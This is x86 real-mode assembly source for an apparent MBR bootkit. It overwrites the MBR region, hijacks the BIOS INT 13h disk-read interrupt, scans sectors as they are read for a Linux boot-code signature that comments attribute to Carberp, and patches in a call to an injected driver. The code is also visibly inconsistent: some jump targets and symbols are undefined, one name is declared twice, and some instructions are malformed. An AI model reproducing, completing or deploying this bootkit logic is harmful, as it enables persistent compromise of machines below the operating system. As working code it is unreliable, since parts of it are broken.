USE 16 ; Use 16b

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
%define UPLOAD_SEGMENT 0x8000 ; Upload sector
%define mbr_sector 0x7c00    ; MBR sector
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

START:
jmp interrupt_case
times 4 - ($-$$)


interrupt_case:
push cs
pop ds

cld
mov cx, 64
xor si, overwrite_old_mbr ; DS:SI segment == MBR
push mbr_sector ; ES:DI segment == MBR
pop es
xor di, di
rep movsb

mov ax, [ss:0x4C] ; <= MBR BYTES
mov word [interrupt_13 + 1], ax
mov ax, [ss:0x4E] ; <= MBE BYTES
mov word [interrupt_13 + 3], ax
mov word [ss:0x4C], handler_13
mov word [ss:0x4E], cs

xor ax, ax
mov dx, ax
mov es, ax

push es
push mbr_sector
retf

handler_13:
pushf

cmp ah, 0x02 ; AH
jz getHook
cmp ah, 0x42
jz getHook
popf

jmp int13_old

interrupt_13:
db 0xEA, 0x00, 0x00, 0x00, 0x00

mbr_sector:
times 80 db 0

linux_relocate_recode:
times 5 db 0

get_open_hook:
popf

push bp
mov bp, sp
push ax

pushf
call dword [cs:interrupt_13 + 1]
jc get_close_hook

pusha
pushf
push es

mov ax, word[bp-2]
cmp ah, 0x02
jz hook_settings

hook_settings:
movzx cx, al
shl cx, 9
mov di, bx

hook_32:
mov  cx, [si+2]
shl  cx, 9
mov  di, [si+4]
push word [si+6]
pop  es
jmp  linux_scan

linux_scan:
call get_boot_code
test ax, ax
je hook_end

call hook_nix_boot_bytes

hook_end:
pop es
popf
popa

get_close_hook:
mov sp, bp
pop bp
retf 0x02

get_boot_code:
cld

linux_boot_continue:
mov al, 0xC1
repne scasb
jne boot_error

cmp dword [es:di + 1], 0x8904EBC1 ; LINUX BOOT SECTOR BY Carberp
jne linux_boot_continue
cmp dword [es:di + 5], 0x20C083D8 ; LINUX BOOT SECTOR BY Carberp
jne linux_boot_continue
lea ax, [di - 1]
jmp boot_true

boot_error:
xor ax, ax

boot_true:
retn

hook_nix_boot_bytes:
push ds
push fs

push ds
pop fs
push 0x00
pop ds

mov dx, word [fs:interrupt_13 + 1]
mov [0x4C], dx
mov dx, word [fs:interrupt_13 + 3]
mov [0x4E], dx

xor edi, edi
mov di, ax

push es

xor ebx, ebx
mov bx, es
shl ebx, 4
movzx eax, di
add ebx, eax
add ebx, 5

xor eax, eax
mov ax, ds
shl eax, 4
add eax, FILE_SYSTEM_DRIVER

sub eax, ebx
mov byte [es:di], 0xE8
mov dword [es:di + 1], eax

pop fs
pop ds
ret

FILE_SYSTEM_HANDLER:

jmp $
